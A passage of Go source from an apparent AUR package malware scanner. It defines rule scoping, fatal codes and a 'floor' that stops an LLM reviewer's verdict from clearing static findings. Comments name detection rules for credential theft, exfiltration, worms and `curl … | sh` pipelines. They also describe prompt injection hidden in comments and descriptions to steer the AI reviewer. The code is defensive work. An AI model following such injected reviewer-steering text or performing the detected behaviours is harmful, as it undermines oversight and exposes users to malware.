			}

			// SRC-002 / SRC-003: examine every http(s) host the package pulls
			// from (source=() binaries, curl/wget in build()/package()) for
			// provenance the host cannot establish (issue #40). The url= line is
			// the upstream homepage, not a download, so it is excluded.
			var upstreamDomain string
			if m := urlField.FindStringSubmatch(text); m != nil {
				upstreamDomain = registrableDomain(m[1])
			}
			for _, m := range httpSourceHost.FindAllStringSubmatchIndex(text, -1) {
				start, host := m[0], text[m[2]:m[3]]
				if isCommentAt(text, start) {
					continue
				}
				if urlField.MatchString(lineAt(text, start)) {
					continue // this is the url= homepage, not a source download
				}
				switch {
				case isGenericHost(host):
					// Provenance not verifiable from the host: the bucket/path is
					// attacker-choosable. A signal to verify, not proof of malice.
					add("SRC-002", "source on a generic object-storage / file host (verify provenance)",
						Medium, name, lineAround(text, start))
				case isDistributionHost(host):
					// Canonical distribution point: a mismatch with url= is
					// expected and carries no provenance signal.
				case upstreamDomain != "" && !isReputableGitHost(host) &&
					registrableDomain(host) != upstreamDomain &&
					!isReputableGitHost(upstreamDomain):
					// Download host matches neither the stated upstream (url=)
					// domain nor a known forge.
					add("SRC-003", "source host does not match the package's stated upstream",
						Medium, name, lineAround(text, start))
				}
			}
		}
	}
	// Cross-file pass: every rule above asks "is this file bad?". This one asks
	// "did I even get all the files?" — the question that a PKGBUILD-only scan
	// of an install-scriptlet worm can never answer from the PKGBUILD alone.
	checkReferences(files, add)
	sort.Slice(hits, func(i, j int) bool {
		if hits[i].File != hits[j].File {
			return hits[i].File < hits[j].File
		}
		return hits[i].Code < hits[j].Code
	})
	return hits
}

// isInstallFile reports whether name is a pacman install scriptlet or hook —
// content that libalpm executes as root on the installing machine. ".INSTALL"
// is the name the scriptlet carries once embedded in a built package.
func isInstallFile(name string) bool {
	base := baseName(name)
	return strings.HasSuffix(base, ".install") || base == ".INSTALL" ||
		strings.HasSuffix(base, ".hook")
}

// isExecutedFile reports whether a file is one that makepkg or pacman actually
// RUNS: the PKGBUILD itself, or an install scriptlet / hook. An AUR repository
// routinely also carries maintainer tooling — release, update.sh, a bump
// script — which is committed alongside the package but never executed by the
// build or the install. Rules about what a package DOES must not fire on those.
func isExecutedFile(name string) bool {
	base := baseName(name)
	return base == "PKGBUILD" || isInstallFile(name)
}

// executedOnly lists rules scoped to files makepkg/pacman execute. "git push"
// is a worm signature in a scriptlet and unremarkable in a maintainer's own
// release script sitting in the same repo — a distinction the file name makes
// and the pattern cannot.
var executedOnly = map[string]bool{
	"WORM-002": true, "WORM-003": true,
	// A download-and-run pipeline in the maintainer's own release/update script
	// is how they refresh a checksum, not how the package behaves on your
	// machine. makepkg never executes those files.
	"DLE-001": true, "DLE-002": true,
	// Same reasoning: a Telegram notification in a maintainer's
	// check-version.sh, and an .onion address inside a .patch to Tor-adjacent
	// software, are not the package's behaviour. Note this is executedOnly and
	// not shellOnly — check-version.sh IS shell, it is simply never run.
	"EXFIL-003": true, "EXFIL-004": true,
}

// isShellFile reports whether a file's content is shell at all. Rules about
// what a package DOES must not be matched against data files — a TOML manifest,
// a .desktop entry, a patch hunk or a README mentions paths and unit names
// without executing anything.
func isShellFile(name string) bool {
	base := baseName(name)
	return base == "PKGBUILD" || isInstallFile(name) ||
		strings.HasSuffix(base, ".sh") || strings.HasSuffix(base, ".bash")
}

// shellOnly lists rules that are only meaningful in shell content. Without this
// scope they fire on any file that happens to contain the right substring: a
// REUSE.toml listing "*.timer" among its licence globs is not systemd
// persistence, and reporting it as critical taught users to ignore the scanner.
var shellOnly = map[string]bool{
	"PERSIST-001": true, "PERSIST-002": true, "PERSIST-004": true,
	// .SRCINFO is generated metadata, not script: `optdepends = sudo: for
	// installation via sudo` DECLARES a dependency named sudo, it does not run
	// it. These rules are command-scoped, but a non-shell file fails to parse
	// and falls back to raw-text matching, which is where that FP came from.
	"PRIV-001": true, "PRIV-003": true,
	"DLE-001": true, "DLE-002": true, "INSTALL-003": true,
	// CRED-003 fired on aide.conf — an intrusion-detection tool's config file
	// naturally names /etc/shadow. Reading a path out of a data file says
	// nothing about what the package does.
	"CRED-003": true, "CRED-001": true, "CRED-002": true,
	// A .desktop file, a translation catalogue or a README is data. Trojan
	// Source hides its characters in code that RUNS; text that merely ships
	// with the package cannot smuggle anything past the shell.
	"UNI-002": true, "UNI-003": true,
	// mpv-git ships a find-deps.py that DELETES LD_PRELOAD from the
	// environment. Python is not shell, and removing a variable is the
	// opposite of manipulating it.
	"ENV-001": true, "ENV-002": true,
}

// installOnly lists rules that only make sense inside a scriptlet: in a
// PKGBUILD these paths are written under $pkgdir by fakeroot, but a scriptlet
// has no $pkgdir — every path it touches is the live system.
// notInInstall lists rules whose premise does not survive inside a scriptlet.
// PRIV-001 asks "does the build try to gain privileges?" — but a scriptlet is
// ALREADY running as root, so there is nothing to gain. `sudo chmod 644
// /etc/netctl/*` in a post_install is a redundant sudo, not an escalation.
var notInInstall = map[string]bool{
	"PRIV-001": true, "PRIV-003": true,
}

var installOnly = map[string]bool{
	"INSTALL-003": true, "PKGMGR-001": true,
	"PERSIST-007": true, "PERSIST-009": true, "PERSIST-010": true,
}

// fatalCodes are findings a model is NOT permitted to talk its way out of.
// Each one is deterministic, has no plausible benign form in an AUR package,
// and was chosen so that a false positive would be a bug worth fixing rather
// than a judgement call worth deferring to an LLM.
var fatalCodes = map[string]bool{
	// install-scriptlet worm family
	"EXFIL-004": true, "WORM-001": true, "WORM-002": true, "WORM-003": true,
	"CRED-004": true, "CRED-005": true, "PKGMGR-001": true,
	"PERSIST-007": true, "PERSIST-009": true,
	// REF-002 is deliberately absent. A hidden scriptlet is a filename, not a
	// behaviour: ~120 AUR packages use a bare .install innocently, and a worm
	// that renames itself evades any filename test for free. Guilt lives in
	// what the scriptlet DOES, which the codes above cover.
	// previously known campaigns and unambiguous RCE / exfil
	"NPM-002": true,
	// CRYPTO-001/002 are deliberately NOT fatal. They are correct about
	// xmrig-bin and friends — those packages ARE miners — but a
	// non-overridable verdict stops someone deliberately installing one even
	// when the model confirms it is exactly what its name says. fatalCodes
	// means "no legitimate form exists"; a knowingly-installed miner has one.
	// Mining hidden in an unrelated package is still caught, because a model
	// would not clear that.
	// DLE-001/DLE-002 are deliberately NOT here. `curl … | sh` at build time is
	// dangerous and always reported — the content is unpinned, absent from
	// source=(), unchecksummed — but it is not evidence of malice. A full-AUR
	// sweep found the only three occurrences were sh.rustup.rs,
	// get-ghcup.haskell.org and a vendor's own installer. fatalCodes means "no
	// legitimate form exists"; a project's own installer is one. Piping from a
	// host unrelated to the package is still condemned, by the model, which can
	// tell the difference — and which a fatal code would pre-empt.
	"SHELL-001": true, "SHELL-002": true, "EXFIL-003": true,
	"OBF-004": true, "UNI-001": true, "UNI-002": true,
	// attempts to steer the reviewer itself
	"AI-001": true, "AI-002": true, "AI-003": true, "AI-004": true, "AI-005": true,
}

// fatalInInstallOnly are codes that are damning inside a scriptlet but have a
// plausible benign form elsewhere: `${BASH_SOURCE[0]}` is a normal way for a
// helper .sh to locate itself, whereas a scriptlet copying itself somewhere is
// a worm. Outside an install file these raise SUSPICIOUS instead of MALICIOUS,
// leaving the judgement with the model — which is what the model is for.
var fatalInInstallOnly = map[string]bool{"WORM-001": true}

// IsFatal reports whether a rule code is non-overridable.
func IsFatal(code string) bool { return fatalCodes[code] }

// Floor returns the LOWEST verdict a scan may report given these hits: "" (no
// constraint), "SUSPICIOUS", or "MALICIOUS". It exists because a model verdict
// is a judgement and a rule hit is a fact, and a fluent judgement should not be
// able to erase a fact. The model may always escalate; it may never clear a
// floor.
//
// The bands are deliberately narrow so the floor does not become noise:
//   - a fatal code (see fatalCodes)                       -> MALICIOUS
//   - REF-001/REF-003: the scan is incomplete             -> SUSPICIOUS
//   - any critical hit inside an .install/.hook scriptlet -> SUSPICIOUS
//   - strict: any critical hit anywhere                   -> SUSPICIOUS
//
// Without strict, an ordinary critical hit in a PKGBUILD (e.g. PRIV-001 sudo,
// which does occur in legitimate packages) still leaves the model free to
// dismiss it as a false positive — which is what the model is for.
func Floor(hits []Hit, strict bool) string {
	rank := map[string]int{"": 0, "SUSPICIOUS": 1, "MALICIOUS": 2}
	floor := ""
	raise := func(v string) {
		if rank[v] > rank[floor] {
			floor = v
		}
	}
	for _, h := range hits {
		switch {
		case fatalCodes[h.Code] && fatalInInstallOnly[h.Code] && !isInstallFile(h.File):
			raise("SUSPICIOUS")
		case fatalCodes[h.Code]:
			raise("MALICIOUS")
		case h.Code == "REF-001" || h.Code == "REF-003":
			raise("SUSPICIOUS")
		case h.Severity == Critical && isInstallFile(h.File):
			raise("SUSPICIOUS")
		case strict && h.Severity == Critical:
			raise("SUSPICIOUS")
		}
	}
	return floor
}

// FloorReasons returns the hits that produced the given floor, so callers can
// show the user WHY a model verdict was overridden rather than just that it was.
func FloorReasons(hits []Hit, strict bool) []Hit {
	var out []Hit
	for _, h := range hits {
		if Floor([]Hit{h}, strict) != "" {
			out = append(out, h)
		}
	}
	return out
}

// FloorCheck is one static finding expressed in the vocabulary of the auditor's
// checklist rather than the rule catalog's. It is deliberately a plain struct
// with no dependency on the scan package: the caller (pipeline) converts it to
// a scan.Check, so rules stays free of that import.
//
// This indirection exists so a static hit and a model-reported behaviour end up
// in the SAME place. Under the Tier-2 checklist the verdict, severities,
// confidence and summary are all derived in Go from which checks fired, so
// folding rule hits in as checks means one deterministic derivation instead of
// a model verdict with a floor bolted on top of it afterwards.
type FloorCheck struct {
	ID       string // a checkCatalog id
	File     string
	Evidence string
	Note     string
}

// checkIDFor maps a rule code onto the checklist id that describes the same
// behaviour. Codes absent from this map fall back to severity-based ids, so a
// new rule is never silently dropped from the floor.
var checkIDFor = map[string]string{
	// the install-scriptlet worm family
	"WORM-001":    "install_scriptlet_worm",
	"WORM-002":    "install_scriptlet_worm",
	"WORM-003":    "install_scriptlet_worm",
	"REF-002":     "incomplete_scan", // warning tier: concealment is a signal, not proof
	"PERSIST-007": "scriptlet_system_takeover",
	"PERSIST-009": "scriptlet_system_takeover",
	"PKGMGR-001":  "scriptlet_system_takeover",
	"CRED-004":    "credential_access",
	"CRED-005":    "credential_access",
	"EXFIL-004":   "exfiltration",
	// pre-existing codes that already have a checklist equivalent
	"CRED-001":  "credential_access",
	"CRED-002":  "credential_access",
	"CRED-003":  "credential_access",
	"EXFIL-003": "exfiltration",
	// NOT pipe_to_shell. That id is critical and means "the script's author is
	// not the software's author" — a judgement about WHOSE host it is, which a
	// regex cannot make. DLE-001/002 only know that something is piped into a
	// shell unpinned, and the full-AUR sweep found every occurrence was the
	// project's own installer (sh.rustup.rs, get-ghcup.haskell.org, a vendor's
	// script).
	//
	// So the static contribution is the cautious classification, and the model
	// is free to escalate to pipe_to_shell when it can see the host has no
	// claim to the package. Mapping it to the critical id instead put the
	// verdict back at MALICIOUS through deriveVerdict even after DLE was taken
	// out of fatalCodes — the same conclusion by a different route.
	"DLE-001":   "unpinned_upstream_installer",
	"DLE-002":   "unpinned_upstream_installer",
	"NPM-002":   "unrelated_pkg_manager_exec",
	"SHELL-001": "remote_code_exec",
	"SHELL-002": "remote_code_exec",
	"OBF-004":   "obfuscated_payload",
	"UNI-001":   "obfuscated_payload",
	"UNI-002":   "obfuscated_payload",
	"AI-001":    "prompt_injection",
	"AI-002":    "prompt_injection",
	"AI-003":    "prompt_injection",
	"AI-004":    "prompt_injection",
	"AI-005":    "prompt_injection",
	// the scanner's own blind spot, not the package's behaviour
	"REF-001": "incomplete_scan",
	"REF-003": "incomplete_scan",
	"REF-004": "incomplete_scan",
}

// AllChecks renders EVERY hit as a checklist entry, at the tier its severity
// implies. FloorChecks covers only the hits that constrain the verdict; this
// covers the rest too, so an offline scan can still report what it found in the
// checklist vocabulary — which is the field a sweep filters on, because a check
// id says what a package DOES while a verdict label says what a scanner called
// it.
//
// It never drives a verdict. Only Floor does that.
func AllChecks(hits []Hit) []FloorCheck {
	out := make([]FloorCheck, 0, len(hits))
	for _, h := range hits {
		id, ok := checkIDFor[h.Code]
		if !ok {
			switch h.Severity {
			case Critical, High:
				id = "other_warning"
			default:
				id = "note"
			}
		}
		out = append(out, FloorCheck{
			ID:       id,
			File:     h.File,
			Evidence: h.Snippet,
			Note:     h.Code + " " + h.Name + " (static rule)",
		})
	}
	return out
}

// FloorChecks renders the floor-triggering hits as checklist entries. The set
// of hits it covers is exactly the set Floor() acts on, so the derived verdict
// cannot disagree with Floor(): a fatal code yields a critical check, and an
// incompleteness or install-scoped critical yields a warning check.
func FloorChecks(hits []Hit, strict bool) []FloorCheck {
	var out []FloorCheck
	for _, h := range FloorReasons(hits, strict) {
		id, ok := checkIDFor[h.Code]
		if !ok {
			// No specific mapping: fall back to the sanctioned catch-alls so
			// the finding still lands at the right severity.
			if Floor([]Hit{h}, strict) == "MALICIOUS" {
				id = "other_critical"
			} else {
				id = "other_warning"
			}
		}
		// A fatal code must never be downgraded by its mapping. WORM-001 in a
		// helper .sh raises SUSPICIOUS, not MALICIOUS (see fatalInInstallOnly),
		// so it maps to a warning id rather than its critical one.
		if Floor([]Hit{h}, strict) == "SUSPICIOUS" && checkCatalogSeverityIsCritical(id) {
			id = "other_warning"
		}
		out = append(out, FloorCheck{
			ID:       id,
			File:     h.File,
			Evidence: h.Snippet,
			Note:     h.Code + " " + h.Name + " (static rule)",
		})
	}
	return out
}

// checkCatalogSeverityIsCritical mirrors the critical tier of the auditor's
// checklist. It is duplicated here rather than imported because rules must not
// depend on scan; the scan package's TestFloorCheckIDsAreKnown pins the two
// together so they cannot drift apart silently.
func checkCatalogSeverityIsCritical(id string) bool {
	switch id {
	case "pipe_to_shell", "unrelated_pkg_manager_exec", "credential_access",
		"remote_code_exec", "kernel_bpf_preload", "exfiltration",
		"disguised_source", "obfuscated_payload", "prompt_injection",
		"privilege_persistence", "install_scriptlet_worm",
		"hidden_install_scriptlet", "scriptlet_system_takeover",
		"other_critical":
		return true
	}
	return false
}

// metadataAssign matches the PKGBUILD/.SRCINFO fields that describe a package
// rather than doing anything: the description, the names, the homepage, the
// licence and the search keywords. Nothing on the right-hand side of these ever
// executes.
// metadataFields are the assignment names whose value merely describes the
// package. Shared with the shell renderer so these never enter the deobfuscated
// command view either.
// pkgname is deliberately absent: a package NAMED xmrig-bin is a miner, and
// CRYPTO-002 detects miners largely by name. A package DESCRIBING xmrig is not
// one. The name is what the package IS; the description is prose about it.
var metadataFields = map[string]bool{
	"pkgdesc": true, "url": true, "license": true,
	"groups": true, "keywords": true, "arch": true,
	"pkgver": true, "pkgrel": true, "epoch": true,
}

var metadataAssign = regexp.MustCompile(
	`(?m)^[ \t]*(pkgdesc|url|license|groups|keywords|arch|pkgver|pkgrel|epoch)[ \t]*=`)

// isMetadataAt reports whether the offset falls on a line that merely DESCRIBES
// the package.
//
// The case that prompted this: aur-malware-check-git carries
//
//	pkgdesc="Detection tools for the June 2026 atomic-lockfile AUR
//	         supply-chain attack …"
//
// and NPM-002 — a non-overridable rule that matches the campaign's payload
// names — flagged it. A tool for detecting an attack was reported as malicious
// for naming the attack it detects.
//
// It is the same defect as PERSIST-002 matching "*.timer" in a REUSE.toml and
// PRIV-001 matching `optdepends = sudo:` in a .SRCINFO: a rule about behaviour
// matching prose. A description is not a behaviour, and no amount of hostile
// text in one can make a package do anything — the model still reads the file
// and will judge a suspicious description on its own terms.
//
// The AI-* and Unicode rules are exempt, because for THOSE the prose IS the
// attack surface: prompt injection aimed at a reviewer works precisely by
// living in text a human skims, and Trojan Source hides in it.
func isMetadataAt(text string, idx int) bool {
	start := strings.LastIndexByte(text[:idx], '\n') + 1
	end := strings.IndexByte(text[start:], '\n')
	if end < 0 {
		end = len(text)
	} else {
		end += start
	}
	line := text[start:end]
	if !metadataAssign.MatchString(line) {
		return false
	}
	// Only the value counts as metadata; a rule matching the field NAME itself
	// (e.g. a suspicious pkgname) is still a match on the line.
	return idx > start
}

// scanEvenInMetadata lists rules that must still see a metadata line.
//
// Two groups. First, rules for which the prose IS the attack surface: text
// addressed to an AI reviewer works precisely by living where a human skims,
// and Trojan Source hides in exactly that text.
//
// Second — and this is the one that is easy to get wrong — the rules whose
// entire subject is the metadata. URL-002 exists to notice a link shortener in
// url=; SRC-00x judges where source=() points; CHK-00x reads the checksum
// arrays; REF-00x resolves install= and source= by name. Excluding metadata
// from those would not reduce false positives, it would switch them off.
func scanEvenInMetadata(code string) bool {
	if isAIRule(code) {
		return true
	}
	switch {
	case strings.HasPrefix(code, "UNI-"),
		strings.HasPrefix(code, "URL-"),
		strings.HasPrefix(code, "SRC-"),
		strings.HasPrefix(code, "NET-"),
		strings.HasPrefix(code, "CHK-"),
		strings.HasPrefix(code, "REF-"):
		return true
	}
	return false
}

// firstLiveMatch returns the start offset of the first match of re that falls
// on neither a full-line comment nor a metadata assignment, or -1 if there is
// none.
func firstLiveMatch(text string, re *regexp.Regexp, skipComments, skipMetadata bool) int {
	for _, loc := range re.FindAllStringIndex(text, -1) {
		if skipComments && isCommentAt(text, loc[0]) {
			continue
		}
		if skipMetadata && isMetadataAt(text, loc[0]) {
			continue
		}
		return loc[0]
	}
	return -1
}

func isAIRule(code string) bool {
	return strings.HasPrefix(code, "AI-")
}

// scanEvenInComments lists rules whose pattern is meaningful even on a
// commented-out line: AI prompt-injection text (the model reads comments) and
// bidi/zero-width characters (Trojan Source hides them in comments).
func scanEvenInComments(code string) bool {
	return isAIRule(code) || code == "UNI-001" || code == "UNI-002"
}

// isCommentAt reports whether the line containing offset idx is a full-line
// shell/desktop comment.
func isCommentAt(text string, idx int) bool {
	start := strings.LastIndexByte(text[:idx], '\n') + 1
	end := strings.IndexByte(text[start:], '\n')
	if end < 0 {
		end = len(text)
	} else {
		end += start
	}
	return commentLine.MatchString(text[start:end])
}

// Worst returns the highest severity among hits ("" if none).
func Worst(hits []Hit) Severity {
	order := map[Severity]int{Medium: 1, High: 2, Critical: 3}
	var worst Severity
	best := 0
	for _, h := range hits {
		if order[h.Severity] > best {
			best, worst = order[h.Severity], h.Severity
		}
	}
	return worst
}

// lineAt returns the full line containing offset idx (untrimmed), used to test
// whether a match sits on the url= assignment line.
func lineAt(text string, idx int) string {
	start := strings.LastIndexByte(text[:idx], '\n') + 1
	end := strings.IndexByte(text[idx:], '\n')
	if end < 0 {
		end = len(text)
	} else {
		end += idx
	}
	return text[start:end]
}

func lineAround(text string, idx int) string {
	start := strings.LastIndexByte(text[:idx], '\n') + 1
	end := strings.IndexByte(text[idx:], '\n')
	if end < 0 {
		end = len(text)
	} else {
		end += idx
	}
	s := strings.TrimSpace(text[start:end])
	if len(s) > 120 {
		s = s[:120]
	}
	return s
}
